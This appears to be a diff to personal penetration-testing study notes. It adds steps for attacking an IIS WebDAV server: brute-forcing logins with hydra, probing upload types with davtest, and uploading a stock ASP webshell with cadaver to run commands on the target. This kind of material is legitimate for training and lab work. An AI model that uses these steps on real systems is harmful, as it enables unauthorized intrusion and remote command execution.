@@ -690,14 +690,29 @@ hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlist
 // check what types of files can be uploaded 
 
 davtest -auth bob:password_123321 -url []/webdav 
+
+// after checking file execution types - we utilise cadaver to upload our asp webshell
+
+cadaver http://[ip]/webdav
+
+-enter creds -
+- pseudo shell is presented, you can upload now a webshell to obtain the web shell execution-
+
+ls -al /usr/share/webshells - to check pre-packed Linux webshells
+
+- in cadaver - put /usr/share/webshells/webshell.asp - will upload to the server, after success you can see the shell on the browser
+- by clicking the webshell in the browser, it will provide with an input box to execute commands on the target system -
+
+
+
 ```
 
 
 ---
-##### IIS Server: WebDav Metasploit
+##### Exploiting WebDav With Metasploit
 
 ---
-##### SMB Server PSexec
+##### Exploiting SMB Server PSexec
 
 ---
 ##### Insecure RDP Service
